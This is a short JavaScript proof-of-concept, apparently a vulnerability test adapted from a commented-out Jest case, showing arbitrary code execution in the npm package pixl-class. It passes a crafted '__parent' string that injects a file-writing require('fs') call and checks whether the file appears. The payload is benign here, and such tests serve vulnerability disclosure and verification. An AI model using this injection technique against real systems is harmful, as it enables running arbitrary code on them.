// test("Arbitrary code execution in pixl-class", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const a = require("pixl-class");
  const path = "./pixl-class";
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
//     console.log("File removed:", path);
   } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  var members = {
    __parent:
      'function(){}; require("fs").writeFileSync("./pixl-class",""); //}',
  };
  try {
    a.create(members);
  } catch (e) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
